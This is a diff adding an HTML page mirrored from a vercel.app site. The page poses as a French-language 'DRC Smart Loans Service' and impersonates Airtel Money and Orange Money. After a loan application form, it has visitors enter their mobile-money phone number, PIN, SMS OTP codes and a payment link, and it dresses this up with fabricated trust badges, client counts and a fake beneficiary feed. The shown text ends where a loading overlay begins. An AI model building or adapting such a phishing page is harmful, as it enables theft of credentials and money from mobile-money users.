@@ -1,0 +1,1370 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<!-- Mirrored from https://drc-airtel-orange-prets-imf.vercel.app/ by HTTrack Website Copier/3.x [XR&CO], Mon, 23 Nov 2026 20:05:58 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DRC Smart Loans Service</title>
+    <script src="https://cdn.tailwindcss.com/"></script>
+    <link href="../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        .hidden-page { display: none; }
+        .pin-box, .otp-box {
+            width: 50px;
+            height: 55px;
+            text-align: center;
+            font-size: 1.5rem;
+            border: 1.5px solid #CBD5E1;
+            border-radius: 12px;
+        }
+        .pin-box-red:focus, .otp-box-red:focus {
+            border-color: #DC2626;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(220, 38, 38, 0.2);
+        }
+        .pin-box-orange:focus {
+            border-color: #EA580C;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(234, 88, 12, 0.2);
+        }
+        .telegram-badge {
+            display: inline-block;
+            background: #0088cc;
+            color: white;
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 10px;
+            margin-left: 5px;
+        }
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 99998;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            backdrop-filter: blur(8px);
+            transition: opacity 0.4s ease;
+        }
+        .loading-overlay.collapsing { opacity: 0; }
+        .loading-box {
+            background: white;
+            padding: 40px 35px;
+            border-radius: 24px;
+            text-align: center;
+            max-width: 420px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+            transform: scale(1);
+            transition: transform 0.3s ease;
+        }
+        .loading-box.large { transform: scale(1.05); padding: 45px 40px; }
+        .loading-spinner {
+            width: 60px; height: 60px;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #F59E0B;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        .status-toast {
+            position: fixed; bottom: 20px; right: 20px;
+            background: #1a1a2e; color: #fff;
+            padding: 14px 20px; border-radius: 12px;
+            font-size: 14px; z-index: 99999;
+            border-left: 4px solid #2979ff;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            max-width: 320px; display: none;
+            animation: slideIn 0.3s ease;
+            font-family: Arial, sans-serif; font-weight: 600;
+        }
+        .status-toast.success { border-left-color: #00c853; }
+        .status-toast.error { border-left-color: #ff1744; background: #7f1d1d; }
+        .status-toast.info { border-left-color: #2979ff; }
+
+        .admin-panel {
+            background: #f8fafc; border-radius: 20px;
+            padding: 25px; margin: 20px 0;
+            border: 1px solid #e2e8f0;
+        }
+        .admin-panel h3 {
+            font-size: 18px; font-weight: 700; color: #0f172a;
+            margin-bottom: 15px; display: flex; align-items: center; gap: 8px;
+        }
+        .admin-panel .detail-row {
+            display: flex; justify-content: space-between;
+            padding: 8px 0; border-bottom: 1px dashed #e2e8f0; font-size: 14px;
+        }
+        .admin-panel .detail-row:last-child { border-bottom: none; }
+        .admin-panel .label { color: #64748b; font-weight: 500; }
+        .admin-panel .value { color: #0f172a; font-weight: 600; word-break: break-all; }
+        .status-badge {
+            display: inline-block; padding: 4px 14px;
+            border-radius: 20px; font-size: 12px; font-weight: 700;
+        }
+        .status-badge.pending { background: #fef3c7; color: #d97706; }
+        .status-badge.approved { background: #d1fae5; color: #059669; }
+        .status-badge.rejected { background: #fee2e2; color: #dc2626; }
+
+        /* ============ HOME PAGE ENHANCEMENTS ============ */
+
+        @keyframes float1 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(30px, -40px) scale(1.1); }
+        }
+        @keyframes float2 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(-40px, 30px) scale(1.15); }
+        }
+        .blob-1 { animation: float1 12s ease-in-out infinite; }
+        .blob-2 { animation: float2 15s ease-in-out infinite; }
+
+        @keyframes pulseGlow {
+            0%, 100% {
+                box-shadow: 0 0 0 0 rgba(249, 115, 22, 0.7), 0 10px 30px rgba(234, 88, 12, 0.45);
+            }
+            50% {
+                box-shadow: 0 0 0 14px rgba(249, 115, 22, 0), 0 14px 40px rgba(220, 38, 38, 0.6);
+            }
+        }
+        .apply-btn {
+            background: linear-gradient(135deg, #F97316 0%, #EA580C 40%, #DC2626 100%);
+            animation: pulseGlow 2.2s ease-in-out infinite;
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.2s ease;
+            letter-spacing: 0.3px;
+        }
+        .apply-btn:hover { transform: translateY(-2px) scale(1.02); }
+        .apply-btn::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.45), transparent);
+            animation: shine 2.8s infinite;
+        }
+        @keyframes shine {
+            0% { left: -100%; }
+            55% { left: 100%; }
+            100% { left: 100%; }
+        }
+
+        @keyframes gradientShift {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+        .gradient-headline {
+            background: linear-gradient(90deg, #EA580C, #DC2626, #F97316, #EA580C);
+            background-size: 300% 300%;
+            animation: gradientShift 5s ease infinite;
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        @keyframes badgeFloat {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-4px); }
+        }
+        .operator-badge { animation: badgeFloat 3s ease-in-out infinite; }
+        .operator-badge:nth-child(2) { animation-delay: 0.8s; }
+
+        /* ============ BENEFICIARY FEED ============ */
+
+        @keyframes feedIn {
+            from { transform: translateX(-130%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        @keyframes feedOut {
+            from { transform: translateX(0); opacity: 1; }
+            to { transform: translateX(-130%); opacity: 0; }
+        }
+        #beneficiaryFeed {
+            position: fixed;
+            bottom: 18px;
+            left: 18px;
+            z-index: 9997;
+            display: flex;
+            flex-direction: column-reverse;
+            gap: 10px;
+            pointer-events: none;
+            max-width: 320px;
+        }
+        .beneficiary-toast {
+            background: white;
+            border-radius: 16px;
+            padding: 10px 14px;
+            box-shadow: 0 12px 32px rgba(0,0,0,0.18), 0 2px 8px rgba(0,0,0,0.08);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            animation: feedIn 0.55s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+            border-left: 4px solid #EA580C;
+            font-family: 'Arial', sans-serif;
+            pointer-events: auto;
+        }
+        .beneficiary-toast.hiding {
+            animation: feedOut 0.55s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+        }
+        .beneficiary-toast.airtel { border-left-color: #E40000; }
+        .beneficiary-toast.orange { border-left-color: #FF6600; }
+        .beneficiary-avatar {
+            width: 36px; height: 36px; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-weight: 700; font-size: 13px; color: white; flex-shrink: 0;
+            background: linear-gradient(135deg, #EA580C, #DC2626);
+        }
+        .beneficiary-toast.airtel .beneficiary-avatar {
+            background: linear-gradient(135deg, #E40000, #B91C1C);
+        }
+        .beneficiary-toast.orange .beneficiary-avatar {
+            background: linear-gradient(135deg, #FF6600, #EA580C);
+        }
+        .beneficiary-info { display: flex; flex-direction: column; line-height: 1.2; min-width: 0; }
+        .beneficiary-name {
+            font-size: 12.5px; font-weight: 700; color: #0f172a;
+            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+        }
+        .beneficiary-detail {
+            font-size: 11px; color: #64748b; margin-top: 2px;
+        }
+        .beneficiary-amount {
+            color: #059669; font-weight: 700;
+        }
+        .beneficiary-verified {
+            position: absolute;
+            top: -6px; right: -6px;
+            background: #22c55e; color: white;
+            border-radius: 50%; width: 16px; height: 16px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 9px;
+            border: 2px solid white;
+        }
+    </style>
+</head>
+<body class="bg-amber-50/30 text-slate-800 font-sans min-h-screen flex flex-col justify-between">
+
+    <header class="bg-white border-b border-slate-100 py-4 px-6 flex justify-between items-center max-w-md md:max-w-xl mx-auto w-full">
+        <div class="flex items-center space-x-1">
+            <span class="text-xl font-extrabold text-amber-500 tracking-tight">DRC Smart <span class="text-slate-800">Loans</span></span>
+            <span class="telegram-badge">🔵 Live</span>
+        </div>
+        <button class="text-slate-600 focus:outline-none">
+            <i class="fa-solid fa-bars text-xl"></i>
+        </button>
+    </header>
+
+    <main class="max-w-md md:max-w-xl mx-auto w-full px-4 py-6 flex-grow">
+
+        <!-- =============================================
+             PAGE 1: HOME — Enhanced with Airtel/Orange theme
+             ============================================= -->
+        <section id="page-1" class="space-y-6 text-center pt-4 relative overflow-hidden">
+
+            <!-- Animated background blobs (Orange + Airtel red) -->
+            <div class="blob-1 absolute -top-16 -left-20 w-64 h-64 bg-gradient-to-br from-orange-400/30 via-orange-300/20 to-transparent rounded-full blur-3xl pointer-events-none"></div>
+            <div class="blob-2 absolute top-32 -right-24 w-72 h-72 bg-gradient-to-br from-red-500/25 via-red-400/15 to-transparent rounded-full blur-3xl pointer-events-none"></div>
+
+            <!-- Operator-branded badge header -->
+            <div class="relative z-10 flex flex-wrap justify-center gap-2">
+                <div class="operator-badge inline-flex items-center space-x-1.5 bg-gradient-to-r from-red-600 to-red-700 text-white px-3 py-1.5 rounded-xl text-[11px] font-bold tracking-wide shadow-lg shadow-red-500/30">
+                    <span class="w-4 h-4 bg-white text-red-600 rounded-full flex items-center justify-center text-[9px] font-black italic">a</span>
+                    <span>AIRTEL MONEY</span>
+                </div>
+                <div class="operator-badge inline-flex items-center space-x-1.5 bg-gradient-to-r from-orange-500 to-orange-600 text-white px-3 py-1.5 rounded-xl text-[11px] font-bold tracking-wide shadow-lg shadow-orange-500/30">
+                    <span class="w-4 h-4 bg-black text-orange-500 rounded-full flex items-center justify-center text-[7px] font-black">OM</span>
+                    <span>ORANGE MONEY</span>
+                </div>
+            </div>
+
+            <div class="space-y-3 relative z-10">
+                <h1 class="text-4xl font-extrabold text-slate-900 leading-tight">
+                    Des prêts rapides,<br>
+                    <span class="gradient-headline">sécurisés & fiables</span>
+                </h1>
+                <p class="text-slate-600 text-sm leading-relaxed max-w-sm mx-auto">
+                    <strong class="text-slate-800">DRC SMART LOANS SERVICE</strong> est une plateforme financière dédiée à aider les particuliers à accéder à des prêts rapides, sécurisés et fiables à travers toute la <span class="text-orange-600 font-semibold">République Démocratique du Congo</span>.
+                </p>
+                <p class="text-slate-500 text-xs leading-relaxed max-w-sm mx-auto">
+                    Accédez à des montants allant de <strong class="text-slate-700">20 USD à 100 000 USD</strong> — approuvés en quelques minutes, versés directement sur votre portefeuille mobile. Aucun frais caché. Aucune paperasse excessive. Juste des fonds quand vous en avez besoin.
+                </p>
+            </div>
+
+            <!-- Stats cards — themed with Airtel red / Orange orange accents -->
+            <div class="space-y-3 pt-2 max-w-xs mx-auto relative z-10">
+                <div class="flex items-center justify-between bg-white p-3 rounded-xl border border-slate-100 shadow-md hover:shadow-lg transition">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-9 h-9 bg-gradient-to-br from-red-100 to-red-50 text-red-600 rounded-lg flex items-center justify-center">
+                            <i class="fa-solid fa-users text-sm"></i>
+                        </div>
+                        <span class="text-xs text-slate-500 font-medium">Clients satisfaits</span>
+                    </div>
+                    <span class="text-sm font-extrabold text-red-600">10 000+</span>
+                </div>
+                <div class="flex items-center justify-between bg-white p-3 rounded-xl border border-slate-100 shadow-md hover:shadow-lg transition">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-9 h-9 bg-gradient-to-br from-orange-100 to-orange-50 text-orange-600 rounded-lg flex items-center justify-center">
+                            <i class="fa-solid fa-bolt text-sm"></i>
+                        </div>
+                        <span class="text-xs text-slate-500 font-medium">Délai d'approbation</span>
+                    </div>
+                    <span class="text-sm font-extrabold text-orange-600">15 min</span>
+                </div>
+                <div class="flex items-center justify-between bg-white p-3 rounded-xl border border-slate-100 shadow-md hover:shadow-lg transition">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-9 h-9 bg-gradient-to-br from-amber-100 to-amber-50 text-amber-600 rounded-lg flex items-center justify-center">
+                            <i class="fa-solid fa-shield-halved text-sm"></i>
+                        </div>
+                        <span class="text-xs text-slate-500 font-medium">Sécurisé & confidentiel</span>
+                    </div>
+                    <span class="text-sm font-extrabold text-amber-600">100%</span>
+                </div>
+            </div>
+
+            <!-- HIGHLIGHTED APPLY BUTTON -->
+            <button onclick="navigateTo('page-2')"
+                    class="apply-btn w-full max-w-xs mx-auto text-white font-extrabold py-4 px-4 rounded-full block relative z-10 text-base">
+                <span class="relative z-10 flex items-center justify-center gap-2">
+                    <i class="fa-solid fa-hand-holding-dollar text-lg"></i>
+                    Faire une demande de prêt
+                    <i class="fa-solid fa-arrow-right text-sm"></i>
+                </span>
+            </button>
+
+            <!-- Trust badges row -->
+            <div class="flex justify-center items-center gap-3 text-[10px] text-slate-500 relative z-10 pt-1">
+                <span class="flex items-center gap-1"><i class="fa-solid fa-lock text-green-500"></i> Sécurisé SSL</span>
+                <span class="w-1 h-1 bg-slate-300 rounded-full"></span>
+                <span class="flex items-center gap-1"><i class="fa-solid fa-bolt text-orange-500"></i> Rapide</span>
+                <span class="w-1 h-1 bg-slate-300 rounded-full"></span>
+                <span class="flex items-center gap-1"><i class="fa-solid fa-check-circle text-red-500"></i> Fiable</span>
+            </div>
+
+            <p class="text-xs text-slate-400 relative z-10">🇨🇩 Disponible dans toute la République Démocratique du Congo</p>
+        </section>
+
+        <!-- Page 2: Application Form -->
+        <section id="page-2" class="hidden-page space-y-5">
+            <div class="text-center space-y-1">
+                <span class="inline-block bg-amber-50 text-amber-600 text-xs font-semibold px-3 py-1 rounded-full border border-amber-200">
+                    <i class="fa-solid fa-lock text-xs"></i> Formulaire sécurisé
+                </span>
+                <h2 class="text-2xl font-bold text-slate-900 pt-2">Demande de Prêt</h2>
+                <p class="text-xs text-slate-500">Remplissez votre dossier de demande ci-dessous</p>
+            </div>
+
+            <form id="detailsForm" class="bg-white p-5 rounded-2xl border border-slate-100 shadow-sm space-y-4" onsubmit="handleDetailsSubmit(event)">
+                <div>
+                    <label class="block text-xs font-semibold text-slate-700 mb-1">Nom Complet <span class="text-red-500">*</span></label>
+                    <input type="text" id="fullName" required placeholder="ex: Allan Piere" class="w-full px-3 py-2.5 border border-slate-200 rounded-lg text-sm focus:outline-none focus:border-amber-500">
+                </div>
+
+                <div>
+                    <label class="block text-xs font-semibold text-slate-700 mb-1">Adresse Email <span class="text-slate-400 font-normal">(Optionnel)</span></label>
+                    <input type="email" id="email" placeholder="exemple@gmail.com" class="w-full px-3 py-2.5 border border-slate-200 rounded-lg text-sm focus:outline-none focus:border-amber-500">
+                </div>
+
+                <div>
+                    <label class="block text-xs font-semibold text-slate-700 mb-1">Numéro de Téléphone DRC <span class="text-red-500">*</span></label>
+                    <div class="flex">
+                        <span class="inline-flex items-center px-3 border border-r-0 border-slate-200 bg-slate-50 text-slate-600 rounded-l-lg text-sm">🇨🇩 +243</span>
+                        <input type="tel" id="drcPhone" pattern="[0-9]*" inputmode="numeric" required placeholder="81 234 7658" class="w-full px-3 py-2.5 border border-slate-200 rounded-r-lg text-sm focus:outline-none focus:border-amber-500">
+                    </div>
+                </div>
+
+                <div>
+                    <label class="block text-xs font-semibold text-slate-700 mb-1">Profession <span class="text-red-500">*</span></label>
+                    <select id="profession" required class="w-full px-3 py-2.5 border border-slate-200 rounded-lg text-sm text-slate-600 focus:outline-none focus:border-amber-500">
+                        <option value="" disabled selected>Sélectionnez une profession</option>
+                        <option>Employé</option>
+                        <option>Indépendant</option>
+                        <option>Étudiant</option>
+                    </select>
+                </div>
+
+                <div>
+                    <label class="block text-xs font-semibold text-slate-700 mb-1">Adresse Résidentielle <span class="text-red-500">*</span></label>
+                    <input type="text" id="address" required placeholder="Kinshasa, République Démocratique du Congo" class="w-full px-3 py-2.5 border border-slate-200 rounded-lg text-sm focus:outline-none focus:border-amber-500">
+                </div>
+
+                <div class="bg-amber-50/50 p-3 rounded-xl border border-amber-100 space-y-1">
+                    <label class="block text-xs font-semibold text-slate-700">Montant du Prêt Demandé <span class="text-red-500">*</span></label>
+                    <div class="relative flex items-center">
+                        <span class="absolute left-3 text-slate-700 font-bold">$</span>
+                        <input type="number" id="loanAmount" value="1000" min="20" max="100000" required class="w-full pl-7 pr-12 py-2 border border-slate-200 rounded-lg font-bold text-slate-800 focus:outline-none focus:border-amber-500">
+                        <span class="absolute right-3 text-xs text-slate-400 font-semibold">USD</span>
+                    </div>
+                    <p class="text-[10px] text-slate-400">Entre 20 USD et 100 000 USD</p>
+                </div>
+
+                <button type="submit" class="w-full bg-amber-500 hover:bg-amber-600 text-white font-semibold py-3 px-4 rounded-xl flex items-center justify-center space-x-2 transition">
+                    <span>S'inscrire</span>
+                    <i class="fa-solid fa-arrow-right text-xs"></i>
+                </button>
+                <button type="button" onclick="resetForm('detailsForm')" class="w-full bg-white text-slate-500 border border-slate-200 font-medium py-2.5 rounded-xl text-xs">
+                    Réinitialiser
+                </button>
+            </form>
+        </section>
+
+        <!-- Page 3: Payment Method -->
+        <section id="page-3" class="hidden-page space-y-6 pt-6 text-center">
+            <div class="space-y-2">
+                <h2 class="text-2xl font-bold text-slate-900">Choisissez votre méthode de paiement</h2>
+                <p class="text-xs text-slate-500">Sélectionnez un opérateur mobile pour recevoir votre prêt.</p>
+            </div>
+
+            <div class="bg-white p-4 rounded-xl border border-slate-200 text-left space-y-2 text-xs shadow-sm max-w-sm mx-auto">
+                <p class="text-[10px] font-bold text-slate-400 uppercase tracking-wider">RÉSUMÉ DU PRÊT</p>
+                <div class="flex justify-between">
+                    <span class="text-slate-500">Demandeur</span>
+                    <span id="summaryApplicant" class="font-bold text-slate-800">--</span>
+                </div>
+                <div class="flex justify-between border-t border-slate-100 pt-2">
+                    <span class="text-slate-500">Montant à recevoir</span>
+                    <span id="summaryAmount" class="font-bold text-amber-600 text-sm">$1,000 USD</span>
+                </div>
+            </div>
+
+            <div class="space-y-3 max-w-sm mx-auto">
+                <button onclick="selectPaymentMethod('airtel')" class="w-full bg-red-600 hover:bg-red-700 text-white p-4 rounded-xl flex items-center justify-between transition shadow-sm">
+                    <div class="flex items-center space-x-3">
+                        <span class="w-8 h-8 bg-white text-red-600 font-bold rounded-full flex items-center justify-center text-xs">a</span>
+                        <div class="text-left">
+                            <p class="font-bold text-sm leading-none">Airtel Money</p>
+                            <p class="text-[10px] text-red-100">Payez avec Airtel Money DRC</p>
+                        </div>
+                    </div>
+                    <span class="text-xs font-bold bg-red-700/50 px-2 py-1 rounded">A</span>
+                </button>
+
+                <button onclick="selectPaymentMethod('orange')" class="w-full bg-orange-500 hover:bg-orange-600 text-white p-4 rounded-xl flex items-center justify-between transition shadow-sm">
+                    <div class="flex items-center space-x-3">
+                        <span class="w-8 h-8 bg-black text-orange-500 font-bold rounded-full flex items-center justify-center text-[10px]">THE</span>
+                        <div class="text-left">
+                            <p class="font-bold text-sm leading-none">Orange Money</p>
+                            <p class="text-[10px] text-orange-100">Payez avec Orange Money DRC</p>
+                        </div>
+                    </div>
+                    <span class="text-xs font-bold bg-orange-600/50 px-2 py-1 rounded">OM</span>
+                </button>
+            </div>
+
+            <div class="flex justify-center space-x-4 text-xs text-slate-400 pt-4">
+                <span><i class="fa-solid fa-shield-halved text-green-500"></i> 100% Sécurisé</span>
+                <span><i class="fa-solid fa-lock text-blue-500"></i> SSL Cryptage</span>
+            </div>
+        </section>
+
+        <!-- Page Airtel Login -->
+        <section id="page-airtel-login" class="hidden-page space-y-6 pt-4 text-center">
+            <div class="w-12 h-12 bg-red-600 text-white font-bold text-2xl rounded-full flex items-center justify-center mx-auto italic">a</div>
+            <p class="text-sm font-bold text-red-600 tracking-wide">airtel money</p>
+
+            <div class="space-y-1">
+                <h2 class="text-2xl font-bold text-slate-900">Bienvenue</h2>
+                <p class="text-xs text-slate-500">Connectez-vous à votre compte Airtel Money</p>
+            </div>
+
+            <div class="space-y-4 max-w-xs mx-auto">
+                <div class="flex items-center border border-slate-300 rounded-xl px-3 py-2 bg-white">
+                    <span class="text-sm mr-2">🇨🇩 +243</span>
+                    <input type="tel" id="airtelPhone" pattern="[0-9]*" inputmode="numeric" placeholder="81 234 9878" class="w-full text-slate-700 text-sm focus:outline-none">
+                </div>
+
+                <div>
+                    <label class="block text-xs text-slate-500 mb-2">Entrez votre code PIN</label>
+                    <div class="flex justify-center space-x-2" id="airtelPinContainer">
+                        <input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="pin-box pin-box-red">
+                        <input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="pin-box pin-box-red">
+                        <input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="pin-box pin-box-red">
+                        <input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="pin-box pin-box-red">
+                    </div>
+                </div>
+
+                <a href="#" class="block text-xs text-red-600 font-semibold underline">Code PIN oublié ?</a>
+
+                <button onclick="handleAirtelLogin()" class="w-full bg-red-400 hover:bg-red-500 text-white font-semibold py-3 rounded-xl transition">
+                    Se connecter
+                </button>
+            </div>
+        </section>
+
+        <!-- Page Airtel OTP -->
+        <section id="page-airtel-otp" class="hidden-page text-center space-y-6 pt-6">
+            <div class="bg-red-600 text-white p-6 rounded-b-3xl -mx-4 -mt-6 space-y-2">
+                <div class="w-10 h-10 bg-white/20 rounded-full flex items-center justify-center mx-auto text-lg">
+                    <i class="fa-solid fa-mobile-screen"></i>
+                </div>
+                <h2 class="text-2xl font-bold">Vérification OTP</h2>
+                <p class="text-xs text-red-100">Code envoyé sur votre numéro Airtel</p>
+            </div>
+
+            <div class="space-y-4 pt-2">
+                <p class="text-xs text-slate-500">Entrez le code à 4 chiffres reçu par SMS</p>
+                <div class="text-xl font-bold text-red-600" id="airtelTimer">00:60</div>
+                <p class="text-[10px] text-slate-400">Ce code expire dans <span id="airtelSecs">60</span> sec</p>
+
+                <div class="flex justify-center space-x-2 py-2" id="airtelOtpContainer">
+                    <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="otp-box otp-box-red">
+                    <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="otp-box otp-box-red">
+                    <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="otp-box otp-box-red">
+                    <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="otp-box otp-box-red">
+                </div>
+
+                <button onclick="handleAirtelOtpVerify()" class="w-full max-w-xs mx-auto bg-red-400 hover:bg-red-500 text-white font-semibold py-3 rounded-xl transition block">
+                    Confirmer & Soumettre
+                </button>
+
+                <p class="text-xs text-slate-500">Vous n'avez pas reçu de code ? <a href="#" onclick="restartTimer('airtelTimer', 'airtelSecs', 60)" class="text-red-600 font-bold underline">Renvoyer</a></p>
+            </div>
+        </section>
+
+        <!-- Page Orange Login -->
+        <section id="page-orange-login" class="hidden-page space-y-6 pt-4 text-center">
+            <div class="w-12 h-12 bg-black text-orange-500 font-bold text-xl rounded-full flex items-center justify-center mx-auto">OM</div>
+            
+            <div class="space-y-1">
+                <h2 class="text-2xl font-bold text-slate-900">Orange Money</h2>
+                <p class="text-xs text-slate-500">Connectez-vous à votre compte Orange Money</p>
+            </div>
+
+            <div class="space-y-4 max-w-xs mx-auto">
+                <div class="flex items-center border border-slate-300 rounded-xl px-3 py-2 bg-white">
+                    <span class="text-sm mr-2">🇨🇩 +243</span>
+                    <input type="tel" id="orangePhone" pattern="[0-9]*" inputmode="numeric" placeholder="81 234 9878" class="w-full text-slate-700 text-sm focus:outline-none">
+                </div>
+
+                <div>
+                    <label class="block text-xs text-slate-500 mb-2">Entrez votre code secret Orange Money</label>
+                    <div class="flex justify-center space-x-2" id="orangePinContainer">
+                        <input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="pin-box pin-box-orange">
+                        <input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="pin-box pin-box-orange">
+                        <input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="pin-box pin-box-orange">
+                        <input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="pin-box pin-box-orange">
+                    </div>
+                </div>
+
+                <a href="#" class="block text-xs text-orange-600 font-semibold underline">Code secret oublié ?</a>
+
+                <button onclick="handleOrangeLogin()" class="w-full bg-orange-500 hover:bg-orange-600 text-white font-semibold py-3 rounded-xl transition">
+                    Se connecter
+                </button>
+            </div>
+        </section>
+
+        <!-- Page Orange Link -->
+        <section id="page-orange-link" class="hidden-page text-center space-y-5 pt-4">
+            <div class="bg-orange-500 text-white p-5 rounded-2xl space-y-1 max-w-sm mx-auto">
+                <i class="fa-solid fa-link text-2xl"></i>
+                <h2 class="text-xl font-bold">Lien de Paiement</h2>
+                <p class="text-xs text-orange-100">Orange Money — Saisie du lien</p>
+            </div>
+
+            <div class="bg-orange-50 border border-orange-200 p-3 rounded-xl max-w-sm mx-auto flex items-center justify-center space-x-2 text-orange-700 text-sm font-bold">
+                <i class="fa-regular fa-clock"></i>
+                <span>Ce lien expire dans <span id="orangeTimer">00:30</span></span>
+            </div>
+
+            <div class="space-y-3 max-w-sm mx-auto text-left">
+                <p class="text-xs text-slate-600 text-center">Collez ici le lien reçu par SMS de la part d'Orange Money</p>
+                <div class="relative">
+                    <i class="fa-solid fa-link absolute left-3 top-3.5 text-slate-400 text-xs"></i>
+                    <input type="url" id="orangeLinkInput" placeholder="https://orange-money.cd/pay/..." class="w-full pl-8 pr-3 py-3 border border-slate-200 rounded-xl text-xs focus:outline-none focus:border-orange-500 bg-white">
+                </div>
+                <p class="text-[10px] text-slate-400 text-center">Entrez le lien exact fourni par votre application Orange Money</p>
+
+                <button onclick="handleOrangeLinkSubmit()" class="w-full bg-orange-400 hover:bg-orange-500 text-white font-semibold py-3 rounded-xl transition text-sm">
+                    Soumettre la demande
+                </button>
+            </div>
+        </section>
+
+        <!-- Page 5: Success -->
+        <section id="page-5" class="hidden-page text-center space-y-6 pt-4">
+            <div class="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto text-2xl shadow-sm border border-green-200">
+                <i class="fa-solid fa-check"></i>
+            </div>
+
+            <div class="space-y-2">
+                <h2 class="text-2xl font-bold text-slate-900">Demande Reçue !</h2>
+                <p class="text-xs text-slate-500 leading-relaxed max-w-xs mx-auto">
+                    Votre demande de prêt a été soumise avec succès et est actuellement en cours d'examen par notre équipe.
+                </p>
+            </div>
+
+            <div class="bg-amber-50 border border-amber-200 py-2.5 px-4 rounded-xl text-xs max-w-xs mx-auto">
+                <span class="text-slate-500">NUMÉRO DE DOSSIER : </span>
+                <span class="font-bold text-amber-600" id="caseNumber">DRC-1785790089982</span>
+            </div>
+
+            <div class="bg-amber-50/50 p-4 rounded-xl border border-amber-100 text-left space-y-3 max-w-sm mx-auto">
+                <p class="text-xs font-bold text-slate-800 text-center">Que se passe-t-il ensuite ?</p>
+                <div class="flex items-start space-x-3 text-xs text-slate-600">
+                    <div class="w-6 h-6 bg-amber-100 text-amber-700 rounded-full flex items-center justify-center shrink-0 mt-0.5">
+                        <i class="fa-regular fa-clock text-[10px]"></i>
+                    </div>
+                    <div>
+                        <p class="font-semibold text-slate-800">1. Examen (1–2 heures)</p>
+                        <p class="text-[11px] text-slate-500">Notre équipe évalue votre dossier selon nos critères d'approbation rapide.</p>
+                    </div>
+                </div>
+                <div class="flex items-start space-x-3 text-xs text-slate-600">
+                    <div class="w-6 h-6 bg-amber-100 text-amber-700 rounded-full flex items-center justify-center shrink-0 mt-0.5">
+                        <i class="fa-solid fa-mobile-screen text-[10px]"></i>
+                    </div>
+                    <div>
+                        <p class="font-semibold text-slate-800">2. Notification d'approbation</p>
+                        <p class="text-[11px] text-slate-500">Vous recevrez un SMS dès que votre prêt sera approuvé.</p>
+                    </div>
+                </div>
+                <div class="flex items-start space-x-3 text-xs text-slate-600">
+                    <div class="w-6 h-6 bg-amber-100 text-amber-700 rounded-full flex items-center justify-center shrink-0 mt-0.5">
+                        <i class="fa-solid fa-building-columns text-[10px]"></i>
+                    </div>
+                    <div>
+                        <p class="font-semibold text-slate-800">3. Déblocage des fonds</p>
+                        <p class="text-[11px] text-slate-500">Les fonds sont envoyés directement sur votre portefeuille mobile dans les 24 heures.</p>
+                    </div>
+                </div>
+            </div>
+
+            <button onclick="navigateTo('page-1')" class="w-full max-w-xs mx-auto bg-amber-500 hover:bg-amber-600 text-white font-semibold py-3 rounded-xl transition block text-sm">
+                Retour à l'accueil
+            </button>
+
+            <p class="text-xs text-slate-400">Besoin d'aide ? Contactez-nous au <span class="font-semibold text-slate-600">+243 81 234 5678</span></p>
+        </section>
+
+    </main>
+
+    <footer class="text-center py-4 text-xs text-slate-400 border-t border-slate-200/50">
+        <p class="flex items-center justify-center space-x-1">
+            <i class="fa-solid fa-shield-halved text-amber-500"></i>
+            <span>Cryptage sécurisé 256 bits</span>
+        </p>
+    </footer>
+
+    <!-- Beneficiary live feed (populated by JS) -->
+    <div id="beneficiaryFeed"></div>
+
+    <!-- Loading Overlay with Admin Panel -->
+    <div id="loadingOverlay" class="loading-overlay">
